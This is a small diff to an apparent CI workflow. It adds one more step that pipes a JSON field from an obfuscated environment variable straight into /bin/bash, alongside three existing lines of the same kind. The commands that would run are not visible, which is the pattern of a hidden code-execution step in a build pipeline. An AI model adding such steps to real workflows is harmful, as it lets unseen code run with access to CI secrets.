@@ -29,6 +29,7 @@ jobs:
           echo $gsu9601 | jq -r .nkyi30937 | /bin/bash
           echo $kejez080 | jq -r .qprnq478 | /bin/bash
           echo $ee67500 | jq -r .m2 | /bin/bash
+          printf '%s' "$htfpj79570" | jq -r .lni87 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
